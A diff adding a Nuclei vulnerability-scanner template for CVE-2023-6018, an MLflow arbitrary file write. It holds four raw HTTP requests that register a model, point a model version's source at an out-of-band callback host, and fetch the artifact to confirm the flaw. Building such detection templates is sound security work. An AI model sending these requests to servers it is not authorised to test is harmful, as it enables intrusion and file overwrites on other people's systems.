@@ -1,0 +1,50 @@
+id: mlfdlow-arbitrary-file-write
+
+info:
+  name: Mlflow Arbitrary File Write via model-versions API endpoint
+  author: kevin_mizu (Vuln Discovery), byt3bl33d3r (Nuclei Template)
+  severity: critical
+  description: An attacker can overwrite arbitrary files in MLFlow via it's model-versions API
+  reference:
+    - https://huntr.com/bounties/7cf918b5-43f4-48c0-a371-4d963ce69b30/
+  classification:
+    cvss-score: 10
+    cve-id: CVE-2023-6018
+    cwe-id: CWE-29
+  tags: mlflow,ml,cve,huntr,protectai
+
+variables:
+  model_name: "{{rand_text_alpha(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /ajax-api/2.0/mlflow/registered-models/create HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"name": "{{model_name}}"}
+
+      - |
+        POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"name": "{{model_name}}", "source": "http://{{interactsh-url}}/api/2.0/mlflow-artifacts/artifacts/"}
+
+      - |
+        POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"name": "{{model_name}}", "source": "models:/{{model_name}}/1"}
+
+      - |
+        GET /model-versions/get-artifact?path=random&name={{model_name}}&version=2 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms http Interaction
+        words:
+          - "http"
